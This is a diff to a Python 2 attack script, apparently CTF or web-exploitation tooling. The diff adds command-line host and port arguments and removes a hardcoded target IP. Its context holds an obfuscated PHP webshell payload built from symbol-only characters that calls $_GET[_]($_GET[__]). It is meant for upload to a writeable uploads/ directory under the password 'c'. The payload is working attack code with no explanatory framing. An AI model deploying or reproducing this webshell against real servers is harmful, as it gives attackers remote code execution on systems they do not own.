@@ -11,9 +11,18 @@
 import requests
 import string
 
+if len(sys.argv) != 3:
+    print "Usage: "
+    print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
+    exit(1)
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+base_url = "http://%s:%d/" % (host, port)
+
 password = "c"
 webshell = "$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;${'_'.$__}[_](${'_'.$__}[__]);".replace("+","%"+"+".encode("hex"))
-base_url = "http://120.24.215.80:10010/"
 writeable = "uploads/"
 webshell_url = ""
 
